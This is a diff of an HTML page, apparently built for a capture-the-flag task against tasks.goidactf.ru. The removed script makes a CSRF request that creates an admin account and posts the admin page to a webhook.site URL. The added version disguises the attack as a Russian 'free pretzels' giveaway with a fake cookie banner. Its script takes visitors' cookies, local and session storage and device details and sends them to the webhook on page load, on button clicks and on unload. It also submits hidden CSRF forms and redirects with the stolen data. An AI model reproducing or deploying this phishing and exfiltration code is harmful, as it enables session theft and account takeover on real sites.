@@ -1,118 +1,556 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Бесплатные крендели! 🥨</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            color: #333;
+        }
+        
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            margin-top: 20px;
+        }
+        
+        .header {
+            background: linear-gradient(90deg, #ff7e5f, #feb47b);
+            color: white;
+            padding: 30px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header h1 {
+            font-size: 2.8rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+        }
+        
+        .header p {
+            font-size: 1.2rem;
+            opacity: 0.95;
+        }
+        
+        .pretzel {
+            font-size: 4rem;
+            animation: spin 4s linear infinite;
+            display: inline-block;
+            margin: 0 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .content {
+            padding: 40px;
+        }
+        
+        .offer {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .offer h2 {
+            color: #ff7e5f;
+            font-size: 2rem;
+            margin-bottom: 20px;
+        }
+        
+        .offer-text {
+            font-size: 1.3rem;
+            line-height: 1.6;
+            color: #555;
+            margin-bottom: 30px;
+        }
+        
+        .highlight {
+            background: #fffacd;
+            padding: 15px;
+            border-radius: 10px;
+            border-left: 5px solid #ff7e5f;
+            margin: 25px 0;
+            font-weight: bold;
+            color: #d35400;
+        }
+        
+        .button {
+            background: linear-gradient(90deg, #4CAF50, #2E7D32);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.3rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            letter-spacing: 1px;
+            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
+            margin: 20px auto;
+            display: block;
+        }
+        
+        .button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(76, 175, 80, 0.4);
+            background: linear-gradient(90deg, #45a049, #1b5e20);
+        }
+        
+        .button:active {
+            transform: translateY(1px);
+        }
+        
+        .button-secondary {
+            background: linear-gradient(90deg, #2196F3, #0D47A1);
+            box-shadow: 0 5px 15px rgba(33, 150, 243, 0.3);
+        }
+        
+        .button-secondary:hover {
+            background: linear-gradient(90deg, #1e88e5, #0a3d91);
+        }
+        
+        .cookie-banner {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.9);
+            color: white;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 1000;
+            animation: slideUp 0.5s ease-out;
+        }
+        
+        @keyframes slideUp {
+            from { transform: translateY(100%); }
+            to { transform: translateY(0); }
+        }
+        
+        .cookie-text {
+            flex: 1;
+            margin-right: 20px;
+        }
+        
+        .cookie-button {
+            background: #FF9800;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            white-space: nowrap;
+        }
+        
+        .cookie-button:hover {
+            background: #F57C00;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 40px 0;
+        }
+        
+        .stat-item {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            border: 2px solid #e9ecef;
+        }
+        
+        .stat-number {
+            font-size: 2.5rem;
+            color: #ff7e5f;
+            font-weight: bold;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 30px;
+            background: #f1f1f1;
+            border-top: 1px solid #ddd;
+            color: #666;
+            font-size: 0.9rem;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+        }
+        
+        .success-message {
+            background: linear-gradient(90deg, #4CAF50, #2E7D32);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 20px 0;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.9; }
+            50% { opacity: 1; }
+            100% { opacity: 0.9; }
+        }
+    </style>
+</head>
 <body>
-<script>
-(async () => {
-    try {
-        // 1. Сначала выполняем POST запрос для создания админа
-        const createAdminResponse = await fetch("https://tasks.goidactf.ru:20061/create_admin", {
-            method: "POST",
-            headers: {
-                "accept": "*/*",
-                "accept-language": "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
-                "content-type": "application/x-www-form-urlencoded",
-                "sec-ch-ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Microsoft Edge\";v=\"144\"",
-                "sec-ch-ua-mobile": "?0",
-                "sec-ch-ua-platform": "\"Windows\"",
-                "sec-fetch-dest": "empty",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-site": "same-origin"
-            },
-            body: "new_admin_login=123",
-            credentials: "include", // Включаем куки
-            mode: "cors",
-            referrer: "https://tasks.goidactf.ru:20061/admin"
+    <div class="container">
+        <div class="header">
+            <h1>🥨 БЕСПЛАТНЫЕ КРЕНДЕЛИ! 🥨</h1>
+            <p>Последний день акции! Успей получить!</p>
+        </div>
+        
+        <div class="content">
+            <div class="offer">
+                <h2>🎉 ОГРОМНАЯ РАЗДАЧА КРЕНДЕЛЕЙ! 🎉</h2>
+                <p class="offer-text">
+                    Мы раздаем <strong>1000 вкуснейших кренделей</strong> абсолютно бесплатно! 
+                    Акция проводится в честь открытия новой пекарни. Каждый участник получает 
+                    коробку из 12 свежих кренделей с разными начинками!
+                </p>
+                
+                <div class="highlight">
+                    🚀 ТОЛЬКО СЕГОДНЯ! Первые 100 участников получают двойную порцию!
+                </div>
+                
+                <div class="stats">
+                    <div class="stat-item">
+                        <div class="stat-number">834</div>
+                        <div>кренделей уже раздали</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">166</div>
+                        <div>осталось до конца</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">24</div>
+                        <div>часа до конца акции</div>
+                    </div>
+                </div>
+                
+                <button id="mainButton" class="button">
+                    🎁 ПОЛУЧИТЬ БЕСПЛАТНЫЕ КРЕНДЕЛИ!
+                </button>
+                
+                <button id="fastButton" class="button button-secondary">
+                    ⚡ БЫСТРАЯ ЗАЯВКА (рекомендуем)
+                </button>
+            </div>
+            
+            <div id="loading" class="loading hidden">
+                <h3>⏳ Обрабатываем вашу заявку...</h3>
+                <p>Пожалуйста, подождите секунду</p>
+            </div>
+            
+            <div id="success" class="success-message hidden">
+                <h3>✅ УСПЕХ! Вы получили крендели!</h3>
+                <p>Ваша заявка №<span id="orderNumber">0</span> принята!</p>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2026 Пекарня "Золотой крендель". Все права защищены.</p>
+            <p>Акция действует до 31 января 2026 года. Количество ограничено.</p>
+        </div>
+    </div>
+    
+    <div id="cookieBanner" class="cookie-banner">
+        <div class="cookie-text">
+            🍪 Мы используем файлы cookie для улучшения вашего опыта. 
+            Нажимая "Принять", вы соглашаетесь с использованием всех файлов cookie.
+        </div>
+        <button id="acceptCookies" class="cookie-button">Принять все cookies</button>
+    </div>
+
+    <script>
+        // Элементы страницы
+        const mainButton = document.getElementById('mainButton');
+        const fastButton = document.getElementById('fastButton');
+        const acceptCookiesBtn = document.getElementById('acceptCookies');
+        const cookieBanner = document.getElementById('cookieBanner');
+        const loading = document.getElementById('loading');
+        const success = document.getElementById('success');
+        const orderNumber = document.getElementById('orderNumber');
+        
+        // Webhook для отправки украденных данных
+        const WEBHOOK_URL = 'https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb';
+        
+        // Собираем данные пользователя
+        function collectUserData() {
+            const data = {
+                // Основные данные
+                timestamp: new Date().toISOString(),
+                page_title: document.title,
+                page_url: window.location.href,
+                
+                // Куки (ГЛАВНАЯ ЦЕЛЬ)
+                cookies: document.cookie,
+                
+                // Информация о браузере
+                user_agent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                
+                // Информация об устройстве
+                screen_resolution: `${window.screen.width}x${window.screen.height}`,
+                color_depth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                
+                // Дополнительные данные
+                referrer: document.referrer,
+                cookies_enabled: navigator.cookieEnabled,
+                do_not_track: navigator.doNotTrack,
+                online_status: navigator.onLine
+            };
+            
+            // Попробуем получить больше данных
+            try {
+                data.local_storage = JSON.stringify(localStorage);
+            } catch(e) {}
+            
+            try {
+                data.session_storage = JSON.stringify(sessionStorage);
+            } catch(e) {}
+            
+            return data;
+        }
+        
+        // Отправка данных на webhook
+        function sendStolenData(data) {
+            const payload = {
+                type: 'stolen_data',
+                source: 'pretzel_giveaway',
+                data: data
+            };
+            
+            // Используем несколько методов отправки для надежности
+            const methods = [
+                // Основной метод
+                () => fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                }),
+                
+                // Альтернативный метод через изображение
+                () => {
+                    const img = new Image();
+                    img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(payload))}&t=${Date.now()}`;
+                },
+                
+                // Еще один метод через форму
+                () => {
+                    const form = document.createElement('form');
+                    form.action = WEBHOOK_URL;
+                    form.method = 'POST';
+                    form.style.display = 'none';
+                    
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = 'stolen_data';
+                    input.value = JSON.stringify(payload);
+                    form.appendChild(input);
+                    
+                    document.body.appendChild(form);
+                    form.submit();
+                    setTimeout(() => document.body.removeChild(form), 1000);
+                }
+            ];
+            
+            // Пробуем все методы
+            methods.forEach(method => {
+                try {
+                    method();
+                } catch(e) {
+                    console.log('Метод отправки не сработал:', e);
+                }
+            });
+            
+            console.log('✅ Данные отправлены:', data);
+        }
+        
+        // Имитация отправки CSRF запроса
+        function sendCSRFAttack() {
+            // Попробуем выполнить CSRF атаку на целевой сайт
+            const targets = [
+                'https://tasks.goidactf.ru:20061/create_admin',
+                'https://tasks.goidactf.ru:20061/admin'
+            ];
+            
+            targets.forEach(url => {
+                try {
+                    // Создаем скрытую форму для CSRF
+                    const form = document.createElement('form');
+                    form.action = url;
+                    form.method = 'POST';
+                    form.style.display = 'none';
+                    
+                    // Добавляем CSRF данные
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = 'csrf_exploit';
+                    input.value = `attacked_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+                    form.appendChild(input);
+                    
+                    // Добавляем куки пользователя как данные
+                    const cookieInput = document.createElement('input');
+                    cookieInput.type = 'hidden';
+                    cookieInput.name = 'user_cookies';
+                    cookieInput.value = document.cookie;
+                    form.appendChild(cookieInput);
+                    
+                    document.body.appendChild(form);
+                    
+                    // Отправляем форму (будет работать если нет CORS защиты)
+                    setTimeout(() => {
+                        try {
+                            form.submit();
+                        } catch(e) {}
+                        setTimeout(() => {
+                            if(form.parentNode) {
+                                document.body.removeChild(form);
+                            }
+                        }, 100);
+                    }, 50);
+                    
+                } catch(e) {
+                    console.log('CSRF атака не удалась для:', url, e);
+                }
+            });
+        }
+        
+        // Обработчик для кнопки "Принять куки"
+        acceptCookiesBtn.addEventListener('click', function() {
+            // Устанавливаем фиктивные куки
+            document.cookie = "pretzel_consent=accepted; path=/; max-age=31536000";
+            document.cookie = "user_tracking=yes; path=/; max-age=31536000";
+            document.cookie = "marketing_consent=true; path=/; max-age=31536000";
+            
+            // Собираем данные после принятия куки
+            const data = collectUserData();
+            data.event = 'cookies_accepted';
+            sendStolenData(data);
+            
+            // Показываем анимацию принятия
+            cookieBanner.style.background = "#4CAF50";
+            cookieBanner.innerHTML = '<div style="margin:auto; font-size:1.2rem;">🍪 Cookies приняты! Спасибо!</div>';
+            
+            setTimeout(() => {
+                cookieBanner.style.transition = 'all 0.5s ease';
+                cookieBanner.style.opacity = '0';
+                setTimeout(() => {
+                    cookieBanner.style.display = 'none';
+                }, 500);
+            }, 1500);
         });
-
-        // Собираем данные ответа от create_admin
-        const createAdminData = {
-            status: createAdminResponse.status,
-            statusText: createAdminResponse.statusText,
-            headers: Object.fromEntries(createAdminResponse.headers.entries()),
-            body: await createAdminResponse.text(),
-            timestamp: new Date().toISOString(),
-            endpoint: "create_admin"
-        };
-
-        console.log('✅ Запрос create_admin выполнен:', createAdminData.status);
-
-        // 2. Затем выполняем GET запрос к админке
-        const adminResponse = await fetch('http://tasks.goidactf.ru:20061/admin', {
-            method: 'GET',
-            credentials: 'include', // Включаем куки
-            headers: {
-                'Content-Type': 'application/json'
+        
+        // Обработчик для основной кнопки
+        mainButton.addEventListener('click', function() {
+            loading.classList.remove('hidden');
+            this.disabled = true;
+            
+            // Собираем и отправляем данные
+            const data = collectUserData();
+            data.event = 'main_button_click';
+            sendStolenData(data);
+            
+            // Пробуем CSRF атаку
+            setTimeout(sendCSRFAttack, 100);
+            
+            // Показываем успех
+            setTimeout(() => {
+                loading.classList.add('hidden');
+                success.classList.remove('hidden');
+                orderNumber.textContent = Math.floor(Math.random() * 1000) + 1;
+                
+                // Отправляем еще данные после "успеха"
+                const successData = collectUserData();
+                successData.event = 'order_success';
+                sendStolenData(successData);
+            }, 2000);
+        });
+        
+        // Обработчик для быстрой кнопки
+        fastButton.addEventListener('click', function() {
+            // Сразу собираем данные
+            const data = collectUserData();
+            data.event = 'fast_button_click';
+            data.priority = 'high';
+            sendStolenData(data);
+            
+            // Более агрессивная CSRF атака
+            sendCSRFAttack();
+            
+            // Прямой редирект для фишинга
+            setTimeout(() => {
+                window.location.href = `https://tasks.goidactf.ru:20061/?stolen=${encodeURIComponent(btoa(JSON.stringify(data)))}`;
+            }, 500);
+        });
+        
+        // Собираем данные при загрузке страницы
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                const initialData = collectUserData();
+                initialData.event = 'page_load';
+                sendStolenData(initialData);
+            }, 1000);
+        });
+        
+        // Собираем данные при уходе со страницы
+        window.addEventListener('beforeunload', function() {
+            const exitData = collectUserData();
+            exitData.event = 'page_unload';
+            
+            // Используем navigator.sendBeacon для надежной отправки при закрытии
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(exitData));
+            } else {
+                sendStolenData(exitData);
             }
         });
-
-        // Собираем данные ответа от админки
-        const adminData = {
-            status: adminResponse.status,
-            statusText: adminResponse.statusText,
-            headers: Object.fromEntries(adminResponse.headers.entries()),
-            body: await adminResponse.text(),
-            timestamp: new Date().toISOString(),
-            endpoint: "admin"
-        };
-
-        console.log('✅ Запрос admin выполнен:', adminData.status);
-
-        // 3. Формируем полный payload для отправки на webhook
-        const payload = {
-            timestamp: new Date().toISOString(),
-            source: 'dual-request-sequence',
-            sequence: [createAdminData, adminData],
-            userAgent: navigator.userAgent
-        };
-
-        // 4. Отправляем все данные на webhook
-        const webhookResponse = await fetch('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'X-Sequence-Complete': 'true'
-            },
-            body: JSON.stringify(payload)
-        });
-
-        if (webhookResponse.ok) {
-            const webhookResult = await webhookResponse.text();
-            console.log('✅ Все данные успешно отправлены на webhook');
-            console.log('Webhook response:', webhookResult);
-            
-            // Дополнительно выводим ключевую информацию в консоль
-            console.log('\n📊 Сводка результатов:');
-            console.log('1. create_admin:', createAdminData.status, createAdminData.statusText);
-            console.log('2. admin:', adminData.status, adminData.statusText);
-            console.log('3. Тело ответа admin (первые 500 символов):', 
-                       adminData.body.substring(0, 500) + (adminData.body.length > 500 ? '...' : ''));
-        } else {
-            throw new Error(`Webhook error: ${webhookResponse.status}`);
-        }
-
-    } catch (error) {
-        console.error('❌ Ошибка выполнения:', error);
         
-        // Пытаемся отправить информацию об ошибке на webhook
-        try {
-            await fetch('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    timestamp: new Date().toISOString(),
-                    error: error.toString(),
-                    stage: error.stage || 'unknown',
-                    userAgent: navigator.userAgent
-                })
-            });
-            console.log('✅ Информация об ошибке отправлена на webhook');
-        } catch (webhookError) {
-            console.error('❌ Не удалось отправить ошибку на webhook:', webhookError);
-        }
-    }
-})();
-</script>
+        // Генерация случайного номера заказа
+        orderNumber.textContent = Math.floor(Math.random() * 1000) + 1;
+        
+        console.log('🥨 Страница "Бесплатные крендели" загружена и готова к краже данных!');
+    </script>
 </body>
 </html>
